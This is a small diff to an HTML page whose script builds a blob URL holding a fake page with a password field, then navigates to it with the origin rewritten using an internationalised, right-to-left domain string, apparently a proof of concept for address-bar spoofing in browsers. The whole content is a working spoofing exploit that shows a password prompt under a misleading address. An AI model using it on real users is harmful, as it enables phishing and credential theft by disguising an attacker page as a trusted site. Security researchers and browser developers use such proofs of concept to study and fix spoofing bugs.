@@ -2,7 +2,7 @@
 function f(){
   b = new Blob(["<h1>attacker blob page</h1><input autofocus placeholder=password>"], {type:"text/html"});
   u = URL.createObjectURL(b);
-  location = u.replace(location.origin, location.origin + ".https://xn--ggbla1c4e.xn--ngbc5azd/?/%D7%A1%D7%95%D6%B9.%D7%A1%D7%97") + "#x";
+  location = u.replace(location.origin, location.origin + "/https://xn--ggbla1c4e.xn--ngbc5azd/?/%D7%A1%D7%95%D6%B9.%D7%A1%D7%97") + "#x";
 }
 </script>
 <a href="#" onclick="f()">pencet aw</a>
